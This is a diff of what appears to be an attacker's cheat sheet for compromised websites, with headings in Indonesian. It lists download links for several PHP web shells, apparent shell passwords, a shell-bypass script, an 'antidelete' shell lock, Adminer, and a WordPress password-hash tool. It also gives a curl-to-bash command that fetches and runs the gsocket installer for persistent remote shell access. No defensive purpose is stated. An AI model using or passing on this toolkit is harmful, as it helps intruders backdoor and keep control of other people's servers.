@@ -1,46 +1,46 @@
-COMMAND SCAN SHELL
+=> COMMAND SCAN SHELL
 find ./* -type f -name '*.php' -printf "%TY-% Tm-%Td %TT %p\n" | sort -n > new.txt
 
-COMMAND SCAN RED DIR
+=> COMMAND SCAN RED DIR
 grep -RPn "(\x47\x4c) *\(" /DIR/
 
-HTACCESS
+=> HTACCESS
 https://nabila2.pages.dev/txt/htaccess.txt
 
-ADMINER
+=> ADMINER
 https://nabila2.pages.dev/txt/adminer.txt
 
-BUAT PASSWORD WORDPRESS
+=> BUAT PASSWORD WORDPRESS
 https://codebeautify.org/wordpress-password-hash-generator
 
-SHELL NB2
+=> SHELL NB2
 https://nabila2.pages.dev/txt/nb2.txt
 cina
 jawajawajawa
 
-SHELL NB3
+=> SHELL NB3
 https://nabila2.pages.dev/txt/nb3.txt
 Nbl02SEO
 
-SHELL ALFA
+=> SHELL ALFA
 https://nabila2.pages.dev/txt/alfabiasa.txt
 
-SHELL FILE MANAGER
+=> SHELL FILE MANAGER
 https://nabila2.pages.dev/txt/filemanager.txt
 
-SHELL HAXOR
+=> SHELL HAXOR
 https://nabila2.pages.dev/txt/haxor.txt
 
-SCRIPT BYPASS SHELL
+=> SCRIPT BYPASS SHELL
 https://nabila2.pages.dev/txt/scbypass.txt
 
-ANTIDELETE SHELL
+=> ANTIDELETE SHELL
 https://nabila2.pages.dev/txt/lock.txt
 
-GSOCKET PASSWORD
+=> GSOCKET PASSWORD
 https://nabila2.pages.dev/txt/gspass.txt
 
-INSTALL GSOCKET
+=> INSTALL GSOCKET
 bash -c "$(curl -fsSL https://gsocket.io/y)"
 
 UNINSTALL GSOCKET
